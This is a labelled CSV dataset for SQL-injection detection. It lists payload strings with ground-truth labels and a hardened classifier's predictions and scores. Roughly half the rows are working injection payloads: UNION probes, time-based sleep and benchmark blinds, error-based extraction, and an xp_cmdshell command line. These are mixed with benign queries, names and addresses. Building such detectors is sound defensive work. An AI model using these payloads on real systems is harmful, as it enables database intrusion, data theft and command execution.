payload,label,hardened_pred_label,hardened_pred_score
"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",1,1,0.99999166
SELECT CURDATE (  ) ;,0,0,8.003723e-06
-9389'  )   order by 1#,1,1,0.99999166
nihei_donat@multaspendientes.cu,0,0,7.928294e-06
dular,0,0,8.013133e-06
-3501'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'spvx'  =  'spvx,1,1,0.99999154
"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'mttj' like 'mttj",1,1,0.99999154
75131649x,0,0,7.913474e-06
SELECT * FROM wp_posts WHERE ID  =  28450 LIMIT 1,0,0,7.930267e-06
-9975 where 9760  =  9760 order by 1--,1,1,0.99999166
1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,0.99999154
"1""   )    )     )   rlike   (  select   (  case when   (  6915  =  4531  )   then 1 else 0x28 end   )    )    and    (    (     (  ""jzzu""  =  ""jzzu",1,1,0.99999166
select sleep  (  5  )   and   (  'qcsv'  =  'qcsv,1,1,0.99999166
"-5320 where 8051  =  8051 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1,0.99999154
-1854'  )   as fmmq where 7326  =  7326 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,1,0.99999154
"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,0.99999154
correch climent,0,0,7.9308265e-06
SELECT * FROM principal WHERE case = 'poor',0,0,8.149145e-06
"-7635"" union all select 1284,1284,1284,1284,1284,1284#",1,1,0.99999166
"-7418 union all select 1340,1340,1340,1340,1340#",1,1,0.99999166
SELECT AVG ( threw )  FROM thing  SELECT SUM ( fair ) ,0,0,7.938197e-06
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""mkal"" like ""mkal",1,1,0.99999166
SELECT COUNT ( ourselves ) FROM saw,0,0,8.159418e-06
"san benito, 182,",0,0,7.902818e-06
chuvalo@ppmanzanares.nc,0,0,7.909468e-06
9857,0,0,8.007938e-06
SELECT * FROM wing FETCH FIRST 50 PERCENT ROWS ONLY,0,0,7.8866e-06
"  UPDATE same SET proud =  'cookies', City =  'act' WHERE studied =  breeze",0,0,7.849711e-06
SELECT * FROM sink  WHERE steel = now,0,0,7.977745e-06
SELECT option_value FROM wp_options WHERE option_name  =  'zcf_captcha_settings' LIMIT 1,0,0,7.94759e-06
SELECT * FROM birds,0,0,8.13026e-06
paley,0,0,7.998352e-06
48825670m,0,0,7.945604e-06
ull colmenares,0,0,7.9456195e-06
SELECT * FROM supply ORDER BY pocket,0,0,8.1019925e-06
1'   )    )    as wqhm where 9871  =  9871,1,1,0.99999166
"   SELECT identity, applied, laidFROM strip WHERE mathematics  IS NOT NULL",0,0,8.064404e-06
SELECT COUNT ( possible )  FROM once,0,0,8.093752e-06
dyck,0,0,8.012965e-06
"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,1,1,0.99999154
SELECT * FROM middle WHERE sound LIKE '%plain%',0,0,8.034849e-06
1'||  (  select 'brsr' where 5458  =  5458,1,1,0.99999166
1%'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  '%'  =  ',1,1,0.99999154
9191,0,0,8.026579e-06
"SELECT customername, contactname FROM customers; ALTER TABLE Customers ADD Email varchar ( 255 ) ; ALTER TABLE Customers DROP COLUMN Email; DROP TABLE Shippers;  TRUNCATE TABLE Categories;",0,0,7.805602e-06
de asbaje abarzuza,0,0,7.899774e-06
; exec master..xp_cmdshell 'ping 10.10.1.2'--,1,1,0.99999166
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1,1,0.99999166
guinee@misanimalesdomesticos.jp,0,0,7.92818e-06
SELECT * FROM  ( SELECT say FROM fire ) ,0,0,8.027712e-06
SELECT where ( s )  FROM subject FULL OUTER JOIN,0,0,7.848409e-06
16417,0,0,8.032528e-06
SELECT * FROM bottom WHERE clear = 'underline' LIMIT 3,0,0,8.061836e-06
SELECT potatoes ( s )  FROM exact FULL OUTER JOIN,0,0,7.930411e-06
38623329g,0,0,7.953065e-06
SELECT COUNT ( DISTINCT last )  FROM simple,0,0,7.841078e-06
SELECT COUNT ( * )  FROM wp_options WHERE option_name LIKE 'wp\\_wps\\_bg\\_image\\_sync\\_1\\_batch\\_%',0,0,7.863769e-06
"1  )   and elt  (  4249  =  4249,7259  )  ",1,1,0.99999166
"1%' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '",1,1,0.99999166
5.96812E+15,0,0,7.905682e-06
2.96618E+15,0,0,7.962884e-06
SELECT * FROM something ORDER BY earth,0,0,8.103221e-06
3.94593E+15,0,0,7.926714e-06
"-9698'   )    )    as qnjv where 3360  =  3360 or make_set  (  9354  =  9354,7185  )  --",1,1,0.99999166
"1'+  (  select pepf where 5071  =  5071 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,0.99999166
"c/ juan de rihuerga, 0,",0,0,7.928694e-06
"pasaje santo angel, 190,",0,0,7.904068e-06
SELECT * FROM alike WHERE sudden = 'immediately',0,0,8.077151e-06
9041,0,0,8.041795e-06
"-6406%'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  '",1,1,0.99999154
SELECT government FROM regular UNION SELECT exist FROM rope ORDER BY bite,0,0,7.972528e-06
"-2460%""  )   or   (  2660  =  5767  )  *5767 and   (  ""%""  =  """,1,1,0.99999166
indocto,0,0,7.994204e-06
" SELECT * FROM finish ORDER BY cow, sound",0,0,8.241949e-06
"  UPDATE sale SET jar =  'shorter', City =  'chain' WHERE occur =  ordinary",0,0,7.872765e-06
carretera rubi 106,0,0,7.913829e-06
muthuswa,0,0,7.944816e-06
SELECT * FROM orange ORDER BY package DESC,0,0,8.040599e-06
FROM  ( SELECT DISTINCT sit FROM create ) ,0,0,7.842723e-06
yahed,0,0,8.002899e-06
vizcaya,0,0,7.951032e-06
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'hbld'  =  'hbld",1,1,0.99999154
"1%'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '",1,1,0.99999166
SELECT castle ( s )  FROM with LEFT JOIN,0,0,7.889534e-06
SELECT TOP 50 PERCENT * FROM substance SELECT * FROM result FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM blow,0,0,7.869065e-06
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",1,1,0.99999166
SELECT * FROM  ( SELECT treated FROM naturally ) ,0,0,8.0463515e-06
SELECT TOP 50 PERCENT * FROM western,0,0,7.963568e-06
SELECT * FROM lot WHERE present NOT LIKE '[ever]%',0,0,8.086778e-06
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",1,1,0.99999166
"  SELECT LTRIM ( ""     SQL Tutorial"" )  AS LeftTrimmedString; ",0,0,7.8506555e-06
" SELECT column_name ( s )  FROM greatly,compare",0,0,7.945801e-06
"   SELECT sent,join,enjoy,putting,vast     (  (  average JOIN extra ON visit.good =  dust.higher )   INNER JOIN shownON Orders.till =  example.steadyID ) ",0,0,7.854407e-06
napoli.scaccia@distritoeste.sv,0,0,7.947711e-06
"-9661""   )    )     )   union all select 2158,2158,2158--",1,1,0.99999166
" end and    (    (     (  ""%""  =  """,1,1,0.99999166
6287,0,0,8.017544e-06
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1,1,0.99999166
SELECT * FROM speech,0,0,8.178372e-06
1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',1,1,0.99999166
-6298' or 4724  =  4876,1,1,0.99999166
SELECT TOP 3 * FROM race,0,0,8.051893e-06
"   SELECT Employees.canal, COUNT ( Orders.properID )  AS meetFROM    ( OrdersINNER JOIN height ON Orders.factorID  =  Employees.freeID ) ",0,0,7.983225e-06
SELECT * FROM honor ORDER BY angry DESC,0,0,8.118234e-06
SELECT COUNT ( opposite ) FROM it,0,0,8.041987e-06
"SELECT CustomerName, ContactName FROM Customers WHERE  Country  =  'Brazil';",0,0,8.0058535e-06
DELETE FROM satellites,0,0,7.924311e-06
25559456q,0,0,7.946923e-06
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""ksip"" like ""ksip",1,1,0.99999154
23522946h,0,0,7.943733e-06
"1""   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,0.99999166
0a0t4d2r,0,0,8.083978e-06
"1""   )    )    as oxrr where 6141  =  6141 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,0.99999154
"  SELECT richID AS ID, bee AS vapor FROM mountain",0,0,7.985669e-06
"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'szib' like 'szib",1,1,0.99999154
atontamiento,0,0,7.92883e-06
"  SELECT mostID AS ID, my AS principle FROM sheep",0,0,8.108601e-06
34081266g,0,0,7.930176e-06
lubna,0,0,7.977258e-06
DELETE FROM hunter,0,0,7.864428e-06
"  SELECT mindID AS ID, burst AS grade FROM stock",0,0,8.219171e-06
SELECT * FROM largest WHERE rhythm = 'breathe',0,0,8.08697e-06
SELECT * FROM fewer,0,0,8.231746e-06
" SELECT * FROM managed ORDER BY official, air",0,0,8.2095585e-06
SELECT AVG ( half ) FROM balance SELECT SUM ( break ) ,0,0,8.108841e-06
SELECT AVG ( object ) FROM beginning SELECT SUM ( pick ) ,0,0,7.845034e-06
"INSERT INTO seldom  ( tomorrow, nearly, scientific )  VALUES  ( 'grew', 'vegetable', 'tongue' )  ",0,0,7.868862e-06
"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """,1,1,0.99999154
SELECT feature FROM although UNION ALL SELECT clear FROM result ORDER BY habit,0,0,8.199582e-06
88918773z,0,0,7.947166e-06
SELECT * FROM task WHERE building = 'somewhere'  OR nails = 'mark',0,0,7.9533065e-06
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  # ewsz,1,1,0.99999154
to85lo372,0,0,7.946286e-06
"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'raus'  =  'raus",1,1,0.99999154
5537,0,0,8.000496e-06
SELECT AVG ( share ) FROM mine SELECT SUM ( front ) ,0,0,8.069451e-06
FROM  ( SELECT DISTINCT mysterious FROM rod ) ,0,0,7.902878e-06
armero filippi,0,0,7.924341e-06
-2783%'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   '%'  =  ',1,1,0.99999154
85766213h,0,0,7.9168185e-06
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 301 )  ORDER BY meta_id ASC",0,0,7.873328e-06
SELECT * FROM policeman WHERE property  BETWEEN 10 AND 20,0,0,8.048823e-06
22115972t,0,0,7.918237e-06
"1""   )    )    as hbfi where 4773  =  4773 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1,0.99999154
docken.carmi@soyrojo.so,0,0,7.94168e-06
select case when 1892  =  3646 then 1 else null end--,1,1,0.99999166
andrease,0,0,8.043329e-06
SELECT drew,0,0,8.174746e-06
5855,0,0,8.004548e-06
"1'+  (  select 'zohk' where 5502  =  5502 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,0.99999166
SELECT somebody ( s )  FROM private SELECT future FROM state,0,0,8.161551e-06
7.69444E+15,0,0,7.910252e-06
7311,0,0,7.99939e-06
ntpadmin,0,0,7.968993e-06
SELECT shout ( s )  FROM standard SELECT toward FROM habit,0,0,8.19093e-06
azadonad?a,0,0,7.908479e-06
SELECT COUNT ( chamber ) FROM managed,0,0,8.141928e-06
"  SELECT ""HELLO""  =  ""hello"";",0,0,7.943543e-06
"  SELECT SUBDATE ( ""2017-06-15"", INTERVAL 10 DAY ) ;",0,0,8.316332e-06
"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",1,1,0.99999166
SELECT zero,0,0,8.276946e-06
SELECT TOP 3 * FROM breathe SELECT * FROM of 3SELECT * FROM sweet,0,0,7.917339e-06
"1%""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""%""  =  """,1,1,0.99999166
ivonne,0,0,8.051317e-06
arquitectnico,0,0,7.93122e-06
SELECT * FROM calm WHERE metal = 'remove' LIMIT 3,0,0,8.067389e-06
hamzeh,0,0,7.999237e-06
FROM  ( SELECT DISTINCT sum FROM science ) ,0,0,7.836757e-06
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,0.99999154
SELECT AVG ( Price ) FROM carry,0,0,8.15419e-06
-7293'   )    )     )   or 3038  =  3038,1,1,0.99999166
aguinaga achutegui,0,0,7.905501e-06
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,1,0.99999166
"1'||  (  select 'wyng' from dual where 2157  =  2157 union all select null,null--",1,1,0.99999166
3245,0,0,8.027146e-06
-6341' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'ugys'  =  'ugys,1,1,0.99999154
"1""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""kzcd""  =  ""kzcd",1,1,0.99999154
SELECT * FROM to WHERE rise IN  ( SELECT difficulty FROM willing ) ,0,0,7.929783e-06
SELECT AVG ( feature ) FROM wheel SELECT SUM ( one ) ,0,0,8.02625e-06
SELECT * FROM compare WHERE journey = 'improve'  AND City = 'trick',0,0,8.093875e-06
or   (  EXISTS  ) ,1,1,0.99999166
7964,0,0,8.0016325e-06
1%'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  '%'  =  ',1,1,0.99999154
"   SELECT bad, us, flame FROM putting WHERE string  IS NULL",0,0,7.968218e-06
SELECT sunlight ( s )  FROM mix SELECT toward FROM mostly,0,0,8.208189e-06
"-6073""   )    )     )   or 9502  =  2012#",1,1,0.99999166
SELECT * FROM announced WHERE stop = 'tired'  AND City = 'oldest',0,0,8.00496e-06
"  SELECT crop AS suit, about AS [listen]  FROM throat",0,0,8.078845e-06
end and    (    (   6874  =  6874,1,1,0.99999166
"calle francisco de leiva, 131,",0,0,7.908502e-06
" select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",1,1,0.99999166
"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,0.99999166
SELECT TOP 3 * FROM aware WHERE after = 'doing',0,0,7.995667e-06
"iif  (  1217  =  8831,1,1/0  )  ",1,1,0.99999166
"1"" where 3933  =  3933 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,1,0.99999166
brias,0,0,7.982837e-06
0a3ramplar,0,0,7.911142e-06
"-2314%'   )    )    union all select 4612,4612--",1,1,0.99999166
"1""   )    )    as sgln where 7573  =  7573",1,1,0.99999166
SELECT * FROM social WHERE globe = 'give' FETCH FIRST 3 ROWS ONLY,0,0,7.956251e-06
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82a3dbb22' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,0,8.198199e-06
1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790,1,1,0.99999154
SELECT Count ( * )  AS giant,0,0,8.109784e-06
"1%'  )   union all select null,null,null,null,null,null--",1,1,0.99999166
marylin,0,0,8.0364125e-06
"-3438""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""nxiv""  =  ""nxiv",1,1,0.99999154
"  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  9815,9815,case when   (  9815  =  9815  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1,1,0.99999154
1'  )   where 9317  =  9317 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1,1,0.99999154
SELECT mental FROM double UNION ALL SELECT were FROM sold ORDER BY rice,0,0,8.13821e-06
"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,0.99999166
dotty,0,0,8.013966e-06
"1,  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",1,1,0.99999154
rosset,0,0,8.035654e-06
SELECT * FROM sky WHERE ever = 'baseball'  OR worse = 'grow',0,0,8.113791e-06
SELECT * FROM queen WHERE riding BETWEEN 'yet' AND 'excitement',0,0,7.969768e-06
1  )   as jdhz where 2021  =  2021,1,1,0.99999166
cunanan,0,0,7.969388e-06
SELECT COUNT ( very )  FROM easier,0,0,8.081095e-06
-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,1,1,0.99999166
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1,0.99999154
"  SELECT Orders.softlyrID, Employees.forgotten, Employees.keep FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.electricityID ORDER BY Orders.cleanID",0,0,7.837362e-06
"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  7984  =  7984",1,1,0.99999154
"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1,1,0.99999154
nue37,0,0,7.957214e-06
"iif  (  1539  =  1539,1539,1/0  )  ",1,1,0.99999166
"   SELECT hand, cook+ ', ' + audience+ ' ' + main+ ', ' + avoid AS adventure  FROM acres",0,0,7.994173e-06
SELECT TOP 50 PERCENT * FROM discover,0,0,7.912456e-06
SELECT take ( s )  FROM helpful SELECT airplane FROM nest,0,0,8.143381e-06
"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",1,1,0.99999154
SELECT TOP 50 PERCENT * FROM map SELECT * FROM shown FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grown,0,0,7.8449075e-06
SELECT sight FROM nine UNION ALL SELECT knew FROM lie ORDER BY aside,0,0,8.041066e-06
"   SELECT sat, exact, classroom FROM clean WHERE music  IS NULL",0,0,8.0671425e-06
"  SELECT smokeID AS ID, fire AS without FROM during",0,0,8.1833105e-06
sangborivutr@ssextremadura.gr,0,0,7.948666e-06
"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'pded'  =  'pded",1,1,0.99999154
SELECT * FROM single WHERE been BETWEEN average09/01/1996movie AND work15/31/1996radio,0,0,7.998283e-06
22997473a,0,0,7.964579e-06
